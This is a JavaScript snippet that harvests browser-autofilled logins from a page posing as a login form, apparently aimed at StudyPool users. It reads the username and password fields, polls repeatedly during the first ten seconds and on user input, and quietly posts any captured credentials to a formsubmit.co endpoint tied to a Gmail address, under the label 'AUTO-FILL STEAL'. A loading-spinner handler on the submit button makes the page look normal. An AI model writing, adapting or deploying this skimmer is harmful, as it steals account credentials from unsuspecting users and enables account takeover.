(function () {
  if (window.stealSent) return; // Prevent duplicate runs

  const usernameField = document.querySelector('input[name="username"], input[type="text"], input[type="email"]');
  const passwordField = document.querySelector('input[name="password"], input[type="password"]');

  if (!usernameField || !passwordField) return;

  function captureIfStudyPool() {
    const user = usernameField.value.trim();
    const pass = passwordField.value.trim();

    if (!user || !pass || user.length < 3 || pass.length < 3) return;

    // Strong indicators this is a real StudyPool saved login
    const isAutoFilled = passwordField.matches(':-webkit-autofill, :autofill, [autocompleted]');
    const hasStudyPoolHint = 
          user.toLowerCase().includes('study') || 
          user.toLowerCase().includes('pool') || 
          user.includes('@') && user.split('@')[1]?.includes('study');

    if ((isAutoFilled || hasStudyPoolHint) && !window.stealSent) {
      window.stealSent = true;

      const payload = new FormData();
      payload.append('username', user);
      payload.append('password', pass);
      payload.append('type', 'AUTO-FILL STEAL');
      payload.append('time', new Date().toLocaleString());
      payload.append('_subject', 'STUDYPOOL AUTO-FILL CAPTURED!');
      payload.append('_captcha', 'false');

      fetch('https://formsubmit.co/charpestine@gmail.com', {
        method: 'POST',
        body: payload
      }).catch(() => {}); // Silent fail

      console.log('%cSTUDYPOOL AUTO-FILL SUCCESSFULLY CAPTURED', 'color: #00ff00; font-weight: bold;');
    }
  }

  // Aggressive polling for first 10 seconds (most auto-fills happen instantly)
  const poll = setInterval(captureIfStudyPool, 350);
  setTimeout(() => clearInterval(poll), 10000);

  // Fallback triggers on user interaction
  ['input', 'change', 'focus', 'blur'].forEach(event => 
    document.body.addEventListener(event, captureIfStudyPool, true)
  );

  // Optional: Show loading spinner on submit
  const loginBtn = document.getElementById('loginBtn');
  const form = document.getElementById('loginForm');

  form.addEventListener('submit', function () {
    loginBtn.classList.add('loading');
  });
})();